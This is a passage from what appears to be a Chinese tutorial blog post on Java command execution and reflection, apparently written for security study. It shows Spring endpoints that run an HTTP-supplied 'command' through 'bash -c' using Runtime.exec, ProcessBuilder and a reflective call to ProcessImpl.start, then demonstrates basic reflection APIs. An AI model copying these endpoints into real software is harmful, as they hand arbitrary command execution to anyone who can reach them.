class="line">       Process process = Runtime.getRuntime().exec(command);</span><br><span class="line">       BufferedReader bufferedReader =</span><br><span class="line">               <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream(), Charset.forName(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">       PrintWriter out = response.getWriter();</span><br><span class="line">       <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="comment">//逐行读取</span></span><br><span class="line">           System.out.println(line);</span><br><span class="line">           out.print(line);</span><br><span class="line">       &#125;</span><br><span class="line">       bufferedReader.close();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">@RequestMapping(&quot;/execRuntimeArray&quot;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execRuntimeArray</span><span class="params">(String command, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">       String line = <span class="keyword">null</span>;</span><br><span class="line">       String[] commandarray =&#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,command&#125;;</span><br><span class="line">       Process process = Runtime.getRuntime().exec(commandarray);</span><br><span class="line">       BufferedReader bufferedReader =</span><br><span class="line">               <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream(), Charset.forName(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">       PrintWriter out = response.getWriter();</span><br><span class="line">       <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="comment">//逐行读取</span></span><br><span class="line">           System.out.println(line);</span><br><span class="line">           out.print(line);</span><br><span class="line">       &#125;</span><br><span class="line">       bufferedReader.close();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h2 id="java-lang-ProcessBuilder"><a href="#java-lang-ProcessBuilder" class="headerlink" title="java.lang.ProcessBuilder"></a>java.lang.ProcessBuilder</h2><p>java.lang.ProcessBuilder 也是java.lang中的一个API。该类主要用于创建操作系统进程</p>
<h3 id="command-方法"><a href="#command-方法" class="headerlink" title="command()方法"></a>command()方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简易示例代码</span></span><br><span class="line">ProcessBuilder p = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">p.command(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="start-方法"><a href="#start-方法" class="headerlink" title="start()方法"></a>start()方法</h3><p>使用 start() 方法可以创建一个新的具有命令，或环境，或工作目录，或输入来源，或标准输出和标准错误输出的目标，或redirectErrorStream属性的进程。<br>新进程中调用的命令和参数有 command() 方法设置，工作目录将由 directory() 方法设置，进程环境将由 environment() 设置。</p>
<p>在使用 command() 方法设置执行命令参数后，然后由 start() 方法创建一个新的进程进而在系统中执行了我们设置的命令。</p>
<p>这么看来 java.lang.ProcessBuilder#start() 和 Runtime.exec(String[] cmdarray, String[] envp, File dir) 有些相似。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简易示例代码</span></span><br><span class="line">Process cmd = <span class="keyword">new</span> ProcessBuilder(command).start();</span><br></pre></td></tr></table></figure>



<h3 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/execProcessBuilder&quot;)</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execProcessBuilder</span><span class="params">(String command,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">     String line;</span><br><span class="line">     ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">     processBuilder.command(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,command);</span><br><span class="line">     Process process = processBuilder.start();</span><br><span class="line">     BufferedReader bf = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));</span><br><span class="line">     PrintWriter out = response.getWriter();</span><br><span class="line">     <span class="keyword">while</span> ((line = bf.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="comment">//逐行读取</span></span><br><span class="line">         System.out.println(line);</span><br><span class="line">         out.print(line);</span><br><span class="line">     &#125;</span><br><span class="line">     bf.close();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>






<h2 id="java-lang-UNIXProcess-ProcessImpl"><a href="#java-lang-UNIXProcess-ProcessImpl" class="headerlink" title="java.lang.UNIXProcess/ProcessImpl"></a>java.lang.UNIXProcess/ProcessImpl</h2><p>UNIXProcess类是*nix系统在java程序中的体现，可以使用该类创建新进程，实现与”fork”类似的功能</p>
<p>对于Windows系统，使用的是java.lang.ProcessImpl类。</p>
<p>UNIXProcess 和 ProcessImpl 可以理解本就是一个东西，因为在JDK9的时候把 UNIXProcess 合并到了 ProcessImpl 当中了。具体可查看：<a class="link" target="_blank" rel="noopener" href="https://hg.openjdk.java.net/jdk-updates/jdk9u/jdk/rev/98eb910c9a97">https://hg.openjdk.java.net/jdk-updates/jdk9u/jdk/rev/98eb910c9a97<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="示例代码-2"><a href="#示例代码-2" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">@RequestMapping(&quot;/execProcessImpl&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">execProcessImpl</span><span class="params">(String command, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InvocationTargetException, IllegalAccessException, NoSuchMethodException </span>&#123;</span><br><span class="line">        String line;</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125;;</span><br><span class="line"></span><br><span class="line">        Class claxx = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        Method method = claxx.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Process process = (Process) method.invoke(<span class="keyword">null</span>, cmds, <span class="keyword">null</span>, <span class="string">&quot;.&quot;</span>, <span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        BufferedReader bf = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        <span class="keyword">while</span> ((line = bf.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//逐行读取</span></span><br><span class="line">            System.out.println(line);</span><br><span class="line">            out.print(line);</span><br><span class="line">        &#125;</span><br><span class="line">        bf.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这部分代码没有测试成功</p>
<h1 id="java-反射"><a href="#java-反射" class="headerlink" title="java 反射"></a>java 反射</h1><h2 id="获取class对象"><a href="#获取class对象" class="headerlink" title="获取class对象"></a>获取class对象</h2><p>获取Class对象的方式有下面几种，：</p>
<ul>
<li>根据类名：类名.class</li>
<li>根据对象：对象.getClass()</li>
<li>根据全限定类名：Class.forName(全路径类名)</li>
<li>通过类加载器获得class对象：ClassLoader.getSystemClassLoader().loadClass(“com.example.xxx”);</li>
</ul>
<h3 id="示例代码-3"><a href="#示例代码-3" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.DEMO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.example.DEMO.entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">            ClassNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//1.通过类名.class</span></span><br><span class="line">        Class c1 = User.class;</span><br><span class="line"><span class="comment">//2.通过对象的getClass()方法</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        Class c2 = user.getClass();</span><br><span class="line"><span class="comment">//3.通过 Class.forName()获得Class对象;</span></span><br><span class="line">        Class c3 = Class.forName(<span class="string">&quot;org.example.DEMO.entity.User&quot;</span>);</span><br><span class="line"><span class="comment">//4.通过类加载器获得class对象</span></span><br><span class="line">        ClassLoader classLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class c4 = classLoader.loadClass(<span class="string">&quot;org.example.DEMO.entity.User&quot;</span>);</span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        System.out.println(c3);</span><br><span class="line">        System.out.println(c4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20230816091042699.png" alt="image-20230816091042699"></p>
<p>需要注意的点</p>
<ul>
<li>类名.class：需要导入类的包。</li>
<li>对象.getClass()：初始化对象后，其实不需要再使用反射了。</li>
<li>Class.forName(全路径类名)：需要知道类的完整全路径，这是我们常使用的方法。</li>
<li>通过类加载器获得class对象：ClassLoader.getSystemClassLoader().loadClass(“com.example.xxx”);</li>
</ul>
<h2 id="反射api"><a href="#反射api" class="headerlink" title="反射api"></a>反射api</h2><p>Java提供了一套反射API，该API由 Class 类与 java.lang.reflect 类库组成。<br>该类库包含了 Field 、 Method 、 Constructor 等类。</p>
<p>在写示例代码前，先准备一个Usernfo类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.DEMO.reflectdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserInfo</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">UserInfo</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserInfo</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">introduce</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我叫&quot;</span> + name + <span class="string">&quot;，今年&quot;</span> + age + <span class="string">&quot;岁了！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello！我叫[&quot;</span> + name + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="java-lang-Class"><a href="#java-lang-Class" class="headerlink" title="java.lang.Class"></a>java.lang.Class</h3><p>用来描述类的内部信息， Class 的实例可以获取类的包、注解、修饰符、名称、超类、接口等。</p>
<h4 id="示例代码-4"><a href="#示例代码-4" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.DEMO.reflectdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">            ClassNotFoundException </span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;org.example.DEMO.reflectdemo.UserInfo&quot;</span>);</span><br><span class="line"><span class="comment">// 获取该类所在包路径</span></span><br><span class="line">        Package aPackage = clazz.getPackage();</span><br><span class="line">        System.out.println(<span class="string">&quot;getPackage运行结果：&quot;</span> + aPackage);</span><br><span class="line"><span class="comment">// 获取类上的修饰符</span></span><br><span class="line">        <span class="keyword">int</span> modifiers = clazz.getModifiers();</span><br><span class="line">        String modifier = Modifier.toString(modifiers);</span><br><span class="line">        System.out.println(<span class="string">&quot;getModifiers运行结果：&quot;</span> + modifier);</span><br><span class="line"><span class="comment">// 获取类名称</span></span><br><span class="line">        String name = clazz.getName();</span><br><span class="line">        System.out.println(<span class="string">&quot;getName运行结果：&quot;</span> + name);</span><br><span class="line"><span class="comment">// 获取简单类名</span></span><br><span class="line">        String simpleName = clazz.getSimpleName();</span><br><span class="line">        System.out.println(<span class="string">&quot;getSimpleName运行结果：&quot;</span> + simpleName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20230816092551347.png" alt="image-20230816092551347"></p>
<h3 id="java-lang-reflect-Field"><a href="#java-lang-reflect-Field" class="headerlink" title="java.lang.reflect.Field"></a>java.lang.reflect.Field</h3><p>提供了类的属性信息。可以获取属性上的注解、修饰符、属性类型、属性名等。</p>
<h4 id="示例代码-5"><a href="#示例代码-5" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.DEMO.reflectdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FieldDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.example.DEMO.reflectdemo.UserInfo&quot;</span>);</span><br><span class="line"><span class="comment">// 获取一个该类或父类中声明为 public 的属性</span></span><br><span class="line">        Field field1 = clazz.getField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;getField运行结果：&quot;</span> + field1);</span><br><span class="line"><span class="comment">// 获取该类及父类中所有声明为 public 的属性</span></span><br><span class="line">        Field[] fieldArray1 = clazz.getFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fieldArray1) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;getFields运行结果：&quot;</span> + field);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 获取一个该类中声明的属性</span></span><br><span class="line">        Field field2 = clazz.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;getDeclaredField运行结果：&quot;</span> + field2);</span><br><span class="line"><span class="comment">// 获取某个属性的修饰符（该示例为获取上面name属性的修饰符）</span></span><br><span class="line">        String modifier = Modifier.toString(field2.getModifiers());</span><br><span class="line">        System.out.println(<span class="string">&quot;getModifiers运行结果： &quot;</span> + modifier);</span><br><span class="line"><span class="comment">// 获取该类中所有声明的属性</span></span><br><span class="line">        Field[] fieldArray2 = clazz.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fieldArray2) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;getDeclaredFields运行结果：&quot;</span> + field);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20230816094620991.png" alt="image-20230816094620991"></p>
<h3 id="java-lang-reflect-Method"><a href="#java-lang-reflect-Method" class="headerlink" title="java.lang.reflect.Method"></a>java.lang.reflect.Method</h3><p>提供了类的方法信息。可以获取方法上的注解、修饰符、返回值类型、方法名称、所有参数</p>
<h4 id="示例代码-6"><a href="#示例代码-6" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.DEMO.reflectdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Parameter;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.example.DEMO.reflectdemo.UserInfo&quot;</span>);</span><br><span class="line"><span class="comment">// 获取一个该类及父类中声明为 public 的方法，需要指定方法的入参类型</span></span><br><span class="line">        Method method = clazz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;01-getMethod运行结果：&quot;</span> + method);</span><br><span class="line"><span class="comment">// 获取所有入参</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        Parameter[] parameters = method.getParameters();</span><br><span class="line">        <span class="keyword">for</span> (Parameter temp : parameters) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;getParameters运行结果 &quot;</span> + temp);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">// 获取该类及父类中所有声明为 public 的方法</span></span><br><span class="line">        Method[] methods = clazz.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method temp : methods) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;02-getMethods运行结果：&quot;</span> + temp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">// 获取一个在该类中声明的方法</span></span><br><span class="line">        Method declaredMethod = clazz.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;03-getDeclaredMethod运行结果：&quot;</span> + declaredMethod);</span><br><span class="line"><span class="comment">// 获取所有在该类中声明的方法</span></span><br><span class="line">        Method[] declaredMethods = clazz.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method temp : declaredMethods) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;04-getDeclaredMethods运行结果：&quot;</span> + temp);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20230816094545592.png" alt="image-20230816094545592"></p>
<h3 id="java-lang-reflect-Modifier"><a href="#java-lang-reflect-Modifier" class="headerlink" title="java.lang.reflect.Modifier"></a>java.lang.reflect.Modifier</h3><p>提供了访问修饰符信息。通过 Class 、 Field 、 Method 、 Constructor 等对象都可以获取修饰符，这个访问修饰符是一个整数，可以通过 Modifier.toString 方法来查看修饰符描述。并且该类提供了一些静态方法和常量来解码访问修饰符。(修饰符就是前面的public，private之类的东西)</p>
<h4 id="示例代码-7"><a href="#示例代码-7" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.DEMO.reflectdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编号7089</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ModifierDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.example.DEMO.reflectdemo.UserInfo&quot;</span>);</span><br><span class="line"><span class="comment">// 获取类的修饰符值</span></span><br><span class="line">        <span class="keyword">int</span> modifiers1 = clazz.getModifiers();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的修饰符值getModifiers运行结果：&quot;</span> + modifiers1);</span><br><span class="line"><span class="comment">// 获取属性的修饰符值</span></span><br><span class="line">        <span class="keyword">int</span> modifiers2 = clazz.getDeclaredField(<span class="string">&quot;name&quot;</span>).getModifiers();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取属性的修饰符值getModifiers运行结果：&quot;</span> + modifiers2);</span><br><span class="line"><span class="comment">// 获取方法的修饰符值</span></span><br><span class="line">        <span class="keyword">int</span> modifiers4 = clazz.getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class).getModifiers();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取方法的修饰符值getModifiers运行结果：&quot;</span> + modifiers4);</span><br><span class="line"><span class="comment">// 根据修饰符值，获取修饰符标志的字符串</span></span><br><span class="line">        String modifier = Modifier.toString(modifiers1);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的修饰符值的字符串结果：&quot;</span> + modifier);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取属性的修饰符值字符串结果：&quot;</span> + Modifier.toString(modifiers2));</span><br><span class="line">        System.out.println(<span class="string">&quot;获取方法的修饰符值资费从结果：&quot;</span> + Modifier.toString(modifiers4));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20230816100737506.png" alt="image-20230816100737506"></p>
<h3 id="java-lang-reflect-Constructor"><a href="#java-lang-reflect-Constructor" class="headerlink" title="java.lang.reflect.Constructor"></a>java.lang.reflect.Constructor</h3><p>提供了类的构造函数信息。可以获取构造函数上的注解信息、参数类型等。</p>
